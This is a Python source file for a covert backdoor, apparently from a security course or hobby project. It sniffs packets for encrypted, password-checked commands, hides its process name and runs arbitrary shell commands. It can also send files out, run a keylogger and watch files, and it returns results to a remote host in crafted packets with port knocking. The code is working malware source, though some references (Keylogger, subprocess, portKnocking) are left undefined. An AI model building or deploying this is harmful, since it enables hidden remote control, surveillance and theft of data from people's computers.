import socket, os, sys, time, logging
from scapy.all import *
import setproctitle
import encryption
import netifaces
import helpers
from fileUtils import FileTransfer, FileMonitor

class Backdoor(object):

    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList):
        self.state = 0
        self.localIP = lhost
        self.localPort = int(lport)
        self.listenPort = int(lisport)
        self.remoteIP = rhost
        self.remotePort = int(rport)
        self.protocol = proto.upper()
        self.fileTransfer = FileTransfer()
        self.fileMonitor = FileMonitor()
        self.keylogger = Keylogger()

        self.knockList = []
        for port in kList.split(','):
            self.knockList.append(port)

        self.password = password
        self.chunk_size = 16

    def run(self):
        helpers.checkRootPrivilege()
        helpers.maskProcess()
        self.listen()

    def listen(self):
        mFilter = self.protocol.lower() + " and src host " + self.remoteIP + " and dst port " + str(self.localPort) + \
                " and src port " + str(self.remotePort)
        sniff(lfilter=self.is_incoming, filter=mFilter, prn=self.parsePacket)

    def parsePacket(self, packet):
        payload = packet[self.protocol].payload.load
        payload = encryption.decrypt(payload)

        if payload == "":
            return

        pwd = payload[:8]
        cmd = payload[8:]

        if pwd not in self.password:
            print("Incorrect password")
            return
        else:
            self.executeCmd(cmd)

    def executeCmd(self, cmd):
        print("Executing command: {}".format(cmd))
        result = ""
        if cmd[:3] == 'cd ':
            try:
                helpers.cd(cmd[3:])
            except OSError as e:
                result = str(e)

        elif cmd[:4] == 'GET ':
            filename = cmd[4:]
            if not os.path.exists(filename):
                result = "File doesn't exist\n"
            else:
                self.fileTransfer.sendFile(filename)

        elif cmd[:5] == 'KEYON':
            if self.keylogger.start():
                result = "Started keylogger\n"
            else:
                result = "Keylogger started already\n"

        elif cmd[:6] == 'KEYOFF':
            if self.keylogger.stop():
                result = "Stopped keylogger\n"
            else:
                result = "Keylogger already stopped\n"

        elif cmd[:6] == 'WATCH ':
            self.addWatch(cmd[6:])
            result = "Added watch\n"

        elif cmd[:8] == 'RMWATCH ':
            if self.removeWatch(cmd[8:]):
                result = "Removed watch\n"
            else:
                result = "File or directory don't have watch\n"

        elif cmd[:5] == 'CLOSE':
            print("Backdoor closed...\n")
            sys.exit(0)
        else:
            result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()

        if result != "":
            print("Result: %s" % result)
            self.sendResult(result)
        time.sleep(0.1)

    def addWatch(self, path):
        try:
            dir, filename = path.split(',')
        except ValueError:
            dir = path
            filename = None

        self.fileMonitor.addWatch(dir, filename=filename)

    def removeWatch(self, path):
        return self.fileMonitor.removeWatch(path)

    def sendResult(self, data):
        knocker = self.portKnocking(self.knockList)
        time.sleep(3)

        payload = encryption.encrypt(self.password + data)

        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
        send(packet, verbose=False)

    def is_incoming(self, packet):
        """
        Check if packets are incoming or outgoing.
        """
        # Get the default hardware interface
        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
        return packet[Ether].src != hardwareAddr
